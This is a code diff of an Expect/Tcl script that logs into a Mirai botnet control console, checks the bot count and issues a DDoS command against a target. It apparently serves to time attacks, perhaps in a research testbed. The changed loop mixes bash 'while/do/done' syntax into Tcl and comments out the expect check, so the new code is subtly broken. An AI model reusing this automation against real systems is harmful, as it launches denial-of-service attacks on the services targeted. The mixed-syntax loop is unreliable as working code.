@@ -34,24 +34,26 @@ send "mirai-pass\r"
 expect "mirai-user@botnet#" 
 send "botcount\r" 
 
-while { $flag < 1 } {
-    # puts $flag
-    expect ":	$numOfBots" {
-        set outputTransferFile [open $path/$transferFinishedFile "w+"]
-        puts $outputTransferFile "True"
-        close $outputTransferFile
+while [ $flag -lt 1 ]
+do
+
+# puts $flag
+# expect ":	$numOfBots"
+set outputTransferFile [open $path/$transferFinishedFile "w+"]
+puts $outputTransferFile "True"
+close $outputTransferFile
 
         # Record time finish transfer and start to DDoS
-        set DATE [exec date +%s]
-        set outputTimeFile [open $path/$outputTime "w+"]
-        puts $outputTimeFile $DATE
-        close $outputTimeFile
+set DATE [exec date +%s]
+set outputTimeFile [open $path/$outputTime "w+"]
+puts $outputTimeFile $DATE
+close $outputTimeFile
 
-        send "$DDoSType $targetedDDoS $dur\r"
-	    incr flag
-    }
-    send "botcount\r"
-}
+send "$DDoSType $targetedDDoS $dur\r"
+incr flag
+
+send "botcount\r"
+done
 
 # wait to fully finish DDoS
 set sleep_time [expr $dur + 30]
